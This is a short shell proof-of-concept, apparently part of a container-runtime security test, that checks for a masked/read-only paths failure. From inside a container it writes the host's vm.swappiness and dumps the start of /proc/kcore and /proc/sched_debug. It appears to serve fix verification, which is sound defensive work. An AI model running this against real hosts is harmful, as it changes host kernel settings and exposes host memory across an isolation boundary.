#!/bin/sh
# INJ-A4-maskpaths/pwn.sh — 在容器内运行（作为 init），验证 A4「掩蔽/只读路径失效」
#
# 证据 1：宿主全局 /proc/sys 可写（readonlyPaths 未 remount ro）
#         容器内写 /proc/sys/vm/swappiness（宿主全局 knob）→ 宿主可验证值被改
# 证据 2：/proc/kcore、/proc/sched_debug 未被掩蔽为 /dev/null（MaskPaths 失效）
#         修复态下这些路径被 bind /dev/null，读到空内容
#
# 仅读 + 写一个可复位内核参数，不做破坏性操作。宿主侧复位由 run.sh 完成。

echo "===== A4-PoC: 掩蔽/只读路径失效 ====="

echo "--- [1] 写宿主全局 /proc/sys/vm/swappiness（readonlyPaths 绕过）---"
echo "before: vm.swappiness=$(cat /proc/sys/vm/swappiness 2>/dev/null)"
if echo 77 > /proc/sys/vm/swappiness 2>/dev/null; then
    echo "WRITE-OK: 宿主 swappiness 已被改为 77（当前=$(cat /proc/sys/vm/swappiness)）"
    echo "A4-PWNED: host /proc/sys writable" > /pwned-a4.txt
else
    echo "WRITE-BLOCKED（/proc/sys 应为只读 remount）"
    echo "A4-BLOCKED" > /pwned-a4.txt
fi

echo ""
echo "--- [2] /proc/kcore（宿主物理内存，默认掩蔽为 /dev/null）---"
head -c 128 /proc/kcore 2>&1 | od -A x -t x1z | head -8

echo ""
echo "--- [3] /proc/sched_debug（内核调度/任务信息，默认掩蔽）---"
head -c 256 /proc/sched_debug 2>&1 | od -A x -t x1z | head -4

echo ""
echo "===== A4-PoC done ====="
